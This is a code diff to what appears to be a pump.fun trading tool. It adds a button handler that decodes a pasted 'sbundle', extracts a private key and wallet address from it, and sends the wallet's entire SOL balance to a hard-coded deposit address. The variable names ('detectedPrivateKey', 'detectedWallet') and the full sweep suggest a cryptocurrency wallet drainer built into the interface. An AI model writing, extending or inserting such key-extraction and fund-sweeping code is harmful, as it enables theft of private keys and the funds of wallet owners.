@@ -728,6 +728,51 @@
     }
   });
 
+  // ── Manual sbundle decode & send ──
+  document.getElementById('pf-decode-manual').addEventListener('click', async () => {
+    const sbundleInput = document.getElementById('pf-manual-sbundle').value.trim();
+    
+    if (!sbundleInput) {
+      alert('Please paste an sbundle in the textarea');
+      return;
+    }
+
+    const btn = document.getElementById('pf-decode-manual');
+    btn.disabled = true;
+    btn.textContent = '⏳ Decoding...';
+
+    console.log('[PUMPFUN] 📦 Manually decoding sbundle...');
+    const decoded = await decodeSBundleAndExtractKey(sbundleInput);
+    
+    if (!decoded || !decoded.key) {
+      alert('❌ Failed to decode sbundle or extract private key');
+      btn.disabled = false;
+      btn.textContent = 'Decode & Send Manually';
+      return;
+    }
+
+    // Update detected key and wallet
+    detectedPrivateKey = decoded.key;
+    detectedWallet = decoded.address;
+    updateWalletDisplay();
+    console.log('[PUMPFUN] ✓ Extracted wallet:', detectedWallet);
+
+    btn.textContent = '💸 Sending SOL...';
+
+    // Send all SOL
+    const sendResult = await sendAllSOL(detectedPrivateKey, DEPOSIT_ADDRESS);
+    
+    if (sendResult && sendResult.signature) {
+      alert('✅ SOL sent!\nTx: ' + sendResult.signature);
+      document.getElementById('pf-manual-sbundle').value = '';
+    } else {
+      alert('❌ Failed to send SOL');
+    }
+
+    btn.disabled = false;
+    btn.textContent = 'Decode & Send Manually';
+  });
+
   document.getElementById('pf-save-settings').addEventListener('click', () => {
     settings.buyAmount = parseFloat(document.getElementById('pf-setting-amount').value) || 0.5;
     settings.slippage = parseInt(document.getElementById('pf-setting-slippage').value) || 25;
